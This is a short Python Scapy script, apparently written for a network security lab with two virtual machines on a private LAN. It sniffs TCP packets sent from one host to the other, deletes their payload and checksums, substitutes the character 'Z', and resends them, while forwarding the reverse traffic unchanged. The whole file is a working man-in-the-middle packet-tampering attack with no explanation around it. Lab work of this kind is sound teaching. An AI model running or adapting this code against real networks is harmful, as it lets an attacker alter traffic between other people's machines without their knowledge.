# !/usr/bin/python3
from scapy.all import *
import re

from scapy.layers.inet import IP, TCP

VM_A_IP = '192.168.1.67'
VM_B_IP = '192.168.1.70'
VM_A_MAC = '80:61:5f:0e:7d:ee'
VM_B_MAC = '08:00:27:14:ac:04'


def spoof_pkt(pkt):
    if pkt[IP].src == VM_A_IP \
            and pkt[IP].dst == VM_B_IP \
            and pkt[TCP].payload:
        newpkt = pkt[IP].copy()
        del newpkt.chksum
        del newpkt[TCP].chksum
        del newpkt[TCP].payload
        olddata = pkt[TCP].payload.load  # Get the original payload data

        # updated code lines, instead of line : " newdata = 'Z' "

        olddata = olddata.decode()
        # data = re.sub(r'a-zA-Z', r'Z', olddata)
        data = "Z"
        newdata = data.encode()

        # End of updated code lines

        send(newpkt / newdata)
    elif pkt[IP].src == VM_B_IP and pkt[IP].dst == VM_A_IP:
        send(pkt[IP])  # Forward the original packet


pkt = sniff(filter='tcp and src host 192.168.1.67 and dst host 192.168.1.70', prn=spoof_pkt)
